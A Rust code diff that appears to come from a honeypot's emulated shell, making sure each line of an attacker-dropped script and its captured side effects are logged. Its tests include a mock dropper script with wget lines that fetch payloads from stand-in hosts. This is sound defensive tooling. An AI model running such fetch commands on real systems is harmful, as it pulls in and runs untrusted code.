@@ -252,6 +252,11 @@ fn run_script(shell: &mut Shell, text: &str) -> CommandResult {
     let mut out = String::new();
     let mut errs = String::new();
     let mut status = 0;
+    // `Shell::execute` clears `captures` on entry, so each line would otherwise
+    // wipe the one before it — a script that fetched two payloads would log
+    // only the second. Accumulate across the whole body and hand the lot back,
+    // the way command substitution already does for its subshell.
+    let mut collected = std::mem::take(&mut shell.captures);
 
     for line in text.lines().take(MAX_SCRIPT_LINES) {
         let line = line.trim();
@@ -260,6 +265,14 @@ fn run_script(shell: &mut Shell, text: &str) -> CommandResult {
             continue;
         }
         let result = shell.execute(line);
+        // The network layer logs a `command` event per line the *client*
+        // submits, and these lines came from a file. Capturing each one is what
+        // makes a dropped script observable rather than just its side effects.
+        collected.push(crate::shell::Capture::ScriptCommand {
+            line: line.to_string(),
+            status: result.status,
+        });
+        collected.append(&mut shell.captures);
         // `stdout` is the pipe view and `text` the terminal-combined one; a
         // script's output is going onward as a stream, so only the former.
         out.push_str(&result.stdout);
@@ -273,6 +286,7 @@ fn run_script(shell: &mut Shell, text: &str) -> CommandResult {
             break;
         }
     }
+    shell.captures = collected;
     CommandResult::streams(out, errs, status)
 }
 
@@ -1590,6 +1604,65 @@ mod tests {
         // A missing script fails the way a real shell reports it.
         let missing = shell.execute("sh /tmp/nope.sh");
         assert_eq!(missing.status, 127);
+    }
+
+    /// A `command` event is emitted per line the *client* submits, so without a
+    /// capture per script line the log would show `sh /tmp/p.sh` and nothing of
+    /// what it did — which is exactly the intelligence running the body exists
+    /// to recover.
+    #[test]
+    fn a_dropped_script_reports_each_line_it_ran() {
+        use crate::shell::Capture;
+        let mut shell = Shell::new("root", "debian");
+        shell.execute("printf '#!/bin/sh\\nid\\nnosuchcmd\\n' > /tmp/p.sh");
+        shell.captures.clear();
+        shell.execute("sh /tmp/p.sh");
+
+        let lines: Vec<(String, i32)> = shell
+            .captures
+            .iter()
+            .filter_map(|c| match c {
+                Capture::ScriptCommand { line, status } => Some((line.clone(), *status)),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            lines,
+            vec![("id".to_string(), 0), ("nosuchcmd".to_string(), 127)],
+            "the shebang is not a command; the 127 is the field that names what \
+             to emulate next"
+        );
+    }
+
+    /// `Shell::execute` clears captures on entry, so a script's lines would
+    /// overwrite each other's side effects — the second fetch of a two-stage
+    /// dropper is exactly the one an analyst needs.
+    #[test]
+    fn a_script_keeps_every_line_s_captures() {
+        use crate::shell::Capture;
+        let mut shell = Shell::new("root", "debian");
+        shell.execute(
+            "printf 'wget http://a.example/one\\nwget http://b.example/two\\n' > /tmp/two.sh",
+        );
+        shell.captures.clear();
+        shell.execute("sh /tmp/two.sh");
+
+        let urls: Vec<String> = shell
+            .captures
+            .iter()
+            .filter_map(|c| match c {
+                Capture::Download { url, .. } => Some(url.clone()),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            urls,
+            vec![
+                "http://a.example/one".to_string(),
+                "http://b.example/two".to_string()
+            ],
+            "a line's captures were overwritten by the next line's"
+        );
     }
 
     /// A script that runs itself is the obvious way to turn one upload into an
